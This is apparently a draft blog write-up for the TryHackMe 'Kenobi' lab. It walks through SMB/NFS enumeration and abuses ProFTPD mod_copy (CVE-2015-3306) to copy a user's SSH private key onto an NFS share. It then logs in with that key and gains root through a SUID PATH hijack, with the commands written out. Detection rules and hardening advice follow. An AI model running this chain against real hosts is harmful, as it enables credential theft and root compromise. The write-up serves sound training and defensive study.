---
title: "WriteUp: Kenobi — TryHackMe | Easy"
slug: writeup-thm-kenobi
status: draft
tags: [ctf-writeup, tryhackme, teaser]
excerpt: "An easy Linux machine covering SMB/NFS enumeration, ProFTPD path traversal, and SUID privilege escalation. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="kenobi-%E2%80%94-tryhackme">Kenobi — TryHackMe</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this retired room — not an<br>original solve, and no live flag values are recorded. Complete the bracketed fields when working<br>the room under your own account. Only document legally authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>TryHackMe</td>
</tr>
<tr>
<td>Room</td>
<td>Kenobi</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy</td>
</tr>
<tr>
<td>Category</td>
<td>Linux</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.x.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A Linux host running a vulnerable <strong>ProFTPD 1.3.5</strong>, an exposed <strong>Samba</strong> share, and an NFS export.<br>The chain abuses ProFTPD's <code>mod_copy</code> to stage an SSH key into an NFS-mounted path, gains a foothold<br>over SSH, then escalates to root via a <strong>SUID binary with an unsafe <code>PATH</code></strong> dependency. Teaches<br>service-chaining and SUID/PATH privilege escalation.</p><h2 id="scenario-value-study-scaffold">Scenario value (study scaffold)</h2><ul><li><strong>What it tests:</strong> multi-service enumeration and <em>service chaining</em> — combining a ProFTPD bug, an<br>NFS export, and SSH into one path, then a SUID/PATH privilege escalation.</li><li><strong>What completing it demonstrates:</strong> the habit of enumerating <em>every</em> service and reasoning about<br>how they connect (no single bug suffices), plus classic Linux privesc via an unsafe SUID binary<br>(MITRE T1574.007 / T1548.001).</li></ul><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>Foothold:</strong> ProFTPD <strong>1.3.5 <code>mod_copy</code></strong> arbitrary file copy — <strong>CVE-2015-3306</strong> (the<br><code>SITE CPFR</code>/<code>CPTO</code> commands allow copying files without authentication). <em>Verify CVE when citing.</em></li><li><strong>Privesc:</strong> insecure <strong>SUID</strong> binary (<code>/usr/bin/menu</code>) that calls system utilities <strong>by relative</strong><br><strong>name</strong>, exploitable via <strong><code>PATH</code> manipulation</strong> (CWE-426 Untrusted Search Path / CWE-732 weak<br>permissions).</li><li><strong>Enabler:</strong> <strong>NFS</strong> export and Samba misconfiguration exposing file paths.</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/kenobi 10.x.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Version</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/tcp</td>
<td>ftp</td>
<td>ProFTPD 1.3.5</td>
<td><strong>Foothold — mod_copy</strong></td>
</tr>
<tr>
<td>22/tcp</td>
<td>ssh</td>
<td>OpenSSH</td>
<td>Login path after key theft</td>
</tr>
<tr>
<td>80/tcp</td>
<td>http</td>
<td>Apache</td>
<td>Web surface (enumerate)</td>
</tr>
<tr>
<td>111/tcp</td>
<td>rpcbind</td>
<td>—</td>
<td>Maps to NFS (2049)</td>
</tr>
<tr>
<td>139/445 tcp</td>
<td>smb</td>
<td>Samba</td>
<td>Share enumeration / path disclosure</td>
</tr>
<tr>
<td>2049/tcp</td>
<td>nfs</td>
<td>—</td>
<td><strong>The staging target</strong></td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>[Paste trimmed scan output on completion.]</p><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — all 65,535 TCP ports. Essential here: the solve <em>chains</em> services (FTP + SMB + NFS + SSH),<br>so missing any one open port loses the path.</li><li><code>-sV</code> — version detection. Pins <code>ProFTPD 1.3.5</code> (the <code>mod_copy</code> foothold) and the rpcbind/NFS<br>presence; the ProFTPD version is the load-bearing fact.</li><li><code>-sC</code> — default scripts; <code>nfs-showmount</code> and <code>rpcinfo</code> hints surface the export early.</li><li><code>-oA nmap/kenobi</code> — preserve the multi-service surface for the chaining logic.</li></ul><p><strong>What to look for in the scan:</strong> a <em>combination</em> — ProFTPD 1.3.5 on 21, Samba on 139/445, and<br>rpcbind (111) implying NFS (2049). No single service is the answer; the win is recognising that the<br>FTP bug can write to a path the NFS export will let you read. Map the connections, not just the ports.</p><h2 id="2-enumeration">2. Enumeration</h2><pre><code># Samba shares + NSE
nmap --script "smb-enum-shares,smb-enum-users" -p139,445 10.x.x.x
smbclient -L //10.x.x.x/ -N
smbclient //10.x.x.x/anonymous -N        # read any world-readable share

# NFS exports
showmount -e 10.x.x.x
</code></pre><ul><li>The Samba share commonly leaks a file path / config hint pointing at the user's home and the<br>location of the SSH private key.</li><li><code>showmount -e</code> reveals a <strong>writable / mountable NFS export</strong> (e.g. <code>/var</code>) — this is where the<br><code>mod_copy</code> step will drop the key. [Record share listing + export path on completion.]</li></ul><p><strong>What to look for after SMB/NFS enumeration:</strong> two specific facts that make the chain possible.<br>From Samba: the <strong>disclosed path to <code>id_rsa</code></strong> (the share leaks the user's home/SSH key location).<br>From <code>showmount -e</code>: a <strong>mountable export whose path overlaps a directory ProFTPD can write to</strong><br>(e.g. <code>/var</code>). The exploit only works if the FTP <code>CPTO</code> destination sits <em>inside</em> the NFS export —<br>the enumeration is what confirms those two paths line up before you spend time on the copy.</p><h2 id="3-exploitation">3. Exploitation</h2><p><strong>Step A — copy the SSH private key with ProFTPD <code>mod_copy</code> (unauthenticated)</strong><br><strong>[ATT&amp;CK T1190 — Exploit Public-Facing Application; T1552.004 — Unsecured Credentials: Private Keys]:</strong></p><pre><code>nc 10.x.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa            # CPTO target must sit under the NFS-exported path
</code></pre><p><strong>Step B — mount the NFS export and retrieve the key:</strong></p><pre><code>mkdir /mnt/kenobiNFS
mount -t nfs 10.x.x.x:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
</code></pre><p><strong>Step C — log in over SSH with the stolen key</strong><br><strong>[ATT&amp;CK T1021.004 — Remote Services: SSH]:</strong></p><pre><code>ssh -i id_rsa kenobi@10.x.x.x
</code></pre><ul><li><strong>User flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-privilege-escalation">4. Privilege escalation</h2><pre><code>find / -perm -4000 2&gt;/dev/null        # SUID hunt → /usr/bin/menu
strings /usr/bin/menu                 # shows it calls e.g. `curl`/`ifconfig` by RELATIVE name
</code></pre><ul><li><code>/usr/bin/menu</code> is SUID-root and invokes system binaries by <strong>relative name</strong>, so a hijacked<br><code>PATH</code> makes it run attacker code as root <strong>[ATT&amp;CK T1574.007 — Hijack Execution Flow: Path</strong><br><strong>Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control: Setuid/Setgid]</strong>:</li></ul><pre><code>cd /tmp
echo '/bin/sh' &gt; curl                 # fake the binary the SUID program calls
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu                         # choose the option that triggers `curl` → root shell
</code></pre><ul><li><strong>Root flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="5-tools-used">5. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>)</td>
</tr>
<tr>
<td>Enumeration</td>
<td><code>nmap</code> NSE (<code>smb-enum-*</code>, <code>nfs-*</code>), <code>smbclient</code>, <code>showmount</code></td>
</tr>
<tr>
<td>Exploitation</td>
<td><code>nc</code>/FTP client for <code>mod_copy</code> <code>SITE CPFR/CPTO</code>; <code>mount -t nfs</code>; <code>ssh -i</code></td>
</tr>
<tr>
<td>Privilege escalation</td>
<td><code>find / -perm -4000</code>, <code>strings</code>, <code>PATH</code> hijack, GTFOBins reference</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>T1190</td>
</tr>
<tr>
<td>Credential Access</td>
<td>Unsecured Credentials: Private Keys</td>
<td>T1552.004</td>
</tr>
<tr>
<td>Lateral Movement</td>
<td>Remote Services: SSH</td>
<td>T1021.004</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>Hijack Execution Flow: Path Interception</td>
<td>T1574.007</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>Abuse Elevation Control: Setuid/Setgid</td>
<td>T1548.001</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="7-key-learnings">7. Key learnings</h2><ul><li><strong>Service chaining</strong> — no single bug was sufficient; the solve came from combining mod_copy + NFS</li><li>SSH. Enumerate <em>all</em> services and think about how they connect.</li><li><strong><code>CPTO</code> must target the NFS path</strong> — the whole trick is copying the key to a location you can<br>then mount and read; getting the destination wrong is the usual stall point.</li><li><strong>SUID + relative command = privesc</strong> — always <code>strings</code>/<code>ltrace</code> a SUID binary to see what it<br>calls and whether it trusts <code>PATH</code>. Classic, recurring real-world misconfiguration.</li><li><strong><code>showmount -e</code> is cheap and high-value</strong> — exposed NFS exports are an easy win and easy to miss.</li><li><strong>Blue-team transfer:</strong> detect via anomalous FTP <code>SITE CPFR/CPTO</code> commands, unexpected NFS mounts,<br>and SUID execution with a tampered environment.</li></ul><h2 id="8-defender-perspective-%E2%80%94-logs-detection">8. Defender perspective — logs &amp; detection</h2><p>What this service-chaining attack looks like from a monitored SOC. The chain crosses four services,<br>so detection is multi-source — a good lesson in correlation. (See<br><a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>FTP/ProFTPD logs</strong> (<code>/var/log/proftpd/proftpd.log</code>): unauthenticated <code>SITE CPFR</code> / <code>SITE CPTO</code><br>commands — <code>mod_copy</code> operations against a path under a user's <code>.ssh/</code> are almost never<br>legitimate; the <code>CPFR ... /id_rsa</code> target is the smoking gun.</li><li><strong>NFS / rpc logs:</strong> a new <strong>mount</strong> of an export from an unexpected client IP; on the server,<br><code>rpc.mountd</code> logs the mount request. An external host mounting <code>/var</code> is anomalous.</li><li><strong>auth.log / <code>sshd</code>:</strong> a <strong>public-key SSH login</strong> for <code>kenobi</code> from the attacker IP shortly after<br>the FTP copy — the timing correlation (FTP copy → NFS mount → SSH login, same source, seconds<br>apart) is the detection, more than any single event.</li><li><strong>Privesc:</strong> the SUID <code>/usr/bin/menu</code> executing with a <strong>tampered <code>PATH</code></strong> — auditd <code>execve</code><br>records show <code>menu</code> (UID 0) spawning <code>/tmp/curl</code> or <code>/bin/sh</code>; a root-SUID binary resolving a<br>command out of <code>/tmp</code> is the indicator.</li></ul><p><strong>Example detection logic (correlation, Splunk-style):</strong></p><pre><code>(index=ftp "SITE CPFR" OR "SITE CPTO")
| transaction src_ip maxspan=5m
  with [search index=nfs "mount request"]
  with [search index=os sshd "Accepted publickey"]
| where mvcount(src_ip)=1
</code></pre><p>Plus the host privesc rule (auditd/Sigma): <code>parent=/usr/bin/menu AND child_path startswith /tmp</code>.</p><p><strong>Why it fires:</strong> each step alone could be explained away, but the <em>sequence from one source IP in</em><br><em>minutes</em> (unauth file copy → NFS mount → key-based SSH) has no benign equivalent — this is the<br>correlation work a SOC does. The SUID-from-<code>/tmp</code> execution is independently high-fidelity. Maps to<br><strong>ATT&amp;CK T1190 / T1552.004 / T1021.004 / T1574.007 / T1548.001</strong>.</p><p><strong>Defensive controls:</strong> patch ProFTPD (disable <code>mod_copy</code>); restrict NFS exports with<br><code>root_squash</code> and host allow-lists; never world-readable private keys; audit SUID binaries and<br>ensure they call commands by absolute path; alert on SUID processes resolving binaries from<br>writable directories.</p><h2 id="exam-relevance-%E2%80%94-sec-sy0-701">Exam relevance — Sec+ SY0-701</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>SY0-701 objective</th>
<th>How Kenobi makes it concrete</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>2.3</strong> Vulnerability types</td>
<td>A vulnerable service version (ProFTPd <code>mod_copy</code>) <em>and</em> a misconfiguration (NFS <code>no_root_squash</code>) — the exam's "vulnerable software" and "misconfiguration" categories side by side.</td>
</tr>
<tr>
<td><strong>2.4</strong> Indicators of malicious activity</td>
<td>Service enumeration and the file-write→privesc chain are the recon and post-exploitation indicators the exam expects you to recognise.</td>
</tr>
<tr>
<td><strong>3.1 / 4.1</strong> Secure protocols &amp; hardening</td>
<td>FTP/SMB/NFS exposed without controls is the case study for "use secure protocols, restrict exports, least privilege".</td>
</tr>
<tr>
<td><strong>4.x</strong> Privilege escalation &amp; permissions</td>
<td>The SUID-binary path is the hands-on form of the exam's file-permission / least-privilege material.</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p><strong>Interview line:</strong> "Kenobi is how I revise the misconfiguration half of Domain 2 — NFS <code>no_root_squash</code><br>and a SUID binary are abstract bullet points until you've actually used them to get root."</p><h2 id="9-references">9. References</h2><ul><li>ProFTPD mod_copy CVE-2015-3306 (verify scope before citing).</li><li>GTFOBins — SUID / PATH-interception abuse patterns.</li><li>MITRE ATT&amp;CK T1190, T1552.004, T1021.004, T1574.007, T1548.001.</li></ul>
